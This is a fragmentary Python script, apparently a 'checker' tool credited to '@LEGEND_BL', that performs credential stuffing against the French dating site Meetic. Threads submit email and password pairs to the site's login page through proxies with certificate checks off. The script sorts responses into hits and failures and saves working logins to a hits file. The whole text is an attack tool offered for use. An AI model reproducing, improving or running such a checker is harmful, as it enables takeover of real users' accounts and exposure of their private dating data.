...
print(f"{Fore.CYAN}{'MEETIC.FR CHECKER'.center(columns)}")
...
def worker(q):
    ...
    while True:
        ...
        for attempt in range(2):
            try:
                login_url = "https://secure.meetic.fr/fr/connexion"
                headers = {
                    "User-Agent": userA,
                    "Accept": "application/json",
                    "Accept-Language": "fr-FR,fr;q=0.9,en;q=0.8",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Origin": "https://secure.meetic.fr",
                    "Referer": "https://secure.meetic.fr/fr/connexion"
                }
                payload = {
                    "email": email,
                    "password": pwd
                ...
                r = s.post(login_url, data=payload, headers=headers, proxies=proxy_dict, timeout=15, allow_redirects=False, verify=False)
                
                if r.status_code in [302, 200] and ("profile" in r.text.lower() or "messenger" in r.text.lower() or "account" in r.text.lower()):
                    result = "hit"
                    with counters_lock: hit_counter += 1
                    with open("Meetic_Hits.txt", "a", encoding="utf-8") as f:
                        f.write(f"{email}:{pwd} | Code By - @LEGEND_BL\n")
                    break
                elif "incorrect" in r.text.lower() or "invalid" in r.text.lower() or "erreur" in r.text.lower():
...
# Code By - @LEGEND_BL
    ...
    print(f"{Fore.CYAN}Hits saved to Meetic_Hits.txt")
    input(f"\nPress Enter to exit...")
# Code By - @LEGEND_BL
